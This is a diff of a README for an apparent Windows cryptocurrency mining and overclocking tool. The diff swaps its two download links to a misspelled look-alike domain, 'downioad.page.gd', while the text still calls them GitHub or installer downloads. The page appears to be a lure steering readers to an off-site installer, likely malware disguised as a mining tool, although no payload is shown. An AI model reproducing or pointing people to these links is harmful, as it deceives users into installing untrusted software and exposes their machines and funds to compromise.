@@ -2,7 +2,7 @@
 
 CGMiner 2026 Overclock Benchmarking Suite is a comprehensive tool designed to enhance your cryptocurrency mining experience on Windows. It provides advanced overclocking and benchmarking features to optimize performance and efficiency, making it ideal for both beginners and experienced miners seeking to maximize their output.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -59,6 +59,6 @@ Yes, CGMiner 2026 Overclock Benchmarking Suite supports a wide range of cryptocu
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This tool is provided as-is for enhancing your mining experience. Always ensure compliance with local regulations when mining cryptocurrencies. For support or feedback, visit the GitHub repository or contact the development team.
